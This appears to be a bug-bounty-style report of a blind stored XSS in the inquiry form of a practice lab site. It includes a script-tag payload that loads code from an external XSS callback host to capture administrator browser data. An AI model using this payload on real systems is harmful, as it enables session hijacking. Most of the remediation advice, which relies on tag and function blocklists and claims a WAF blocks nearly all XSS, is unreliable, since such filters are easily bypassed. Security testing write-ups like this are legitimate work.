## Title
Blind XSS - Freelance Full-Stack Developer
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://freelance.pwnedbox.site/

The project inquiry form accepts user-controlled input in fields such as Full Name, Phone, and Message. The submitted content is stored and later displayed in the administrative inquiry panel without proper output encoding. An attacker can submit a malicious script that executes when an administrator views the stored inquiry. This is a Blind XSS vulnerability because the script execution occurs in a separate privileged user's browser, and the attacker receives the execution evidence through an external XSS callback service.

## Steps to Reproduce

1. Open the affected website and navigate to the Contact section.
2. Enter an XSS payload into the Full Name, Phone, or Message field. The payload used in this test referenced an external XSS callback:`"><script src=https://xss.report/c/priyanshxop></script>`
3. Fill in the required fields with valid test data and submit the project inquiry.
4. Verify that the website displays the successful inquiry submission message.
5. Log in to the lab's administrative interface at: https://freelance.pwnedbox.site/admin/login.php
6. Open the submitted inquiry from the admin panel.
7. Observe the stored payload executing in the administrator's browser and check the XSS callback dashboard for captured data.


## POC (Proof of Concept)

Screenshot 1: Malicious payload entered into the project inquiry form.

<img width="1918" height="972" alt="image" src="https://github.com/user-attachments/assets/588762cf-9c58-4c73-84a9-afd568a1a0fe" />

Screenshot 2: The application confirms that the project inquiry was received.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/fbbecf76-d90a-48a1-ba7e-d5288a96da32" />

Screenshot 3: Administrative login page displaying the lab test account.

<img width="1912" height="958" alt="image" src="https://github.com/user-attachments/assets/b0ded26f-0bc9-45a8-a8fe-64ec4da301f0" />

Screenshot 4: Stored inquiry displayed in the admin panel.

<img width="1918" height="968" alt="image" src="https://github.com/user-attachments/assets/32b99361-4638-45b3-b3eb-b3704b2b6b0c" />

Screenshot 5: XSS callback dashboard showing the affected administrative inquiry page and captured browser data.

<img width="1916" height="965" alt="image" src="https://github.com/user-attachments/assets/5c7aa901-17d2-4676-957a-f33b5cbe0d4e" />

Screenshot 6: DOM evidence showing injected HTML and an event handler executing in the admin page.

<img width="1918" height="970" alt="image" src="https://github.com/user-attachments/assets/1328f2ef-42cf-4643-85fc-6857587d7af5" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
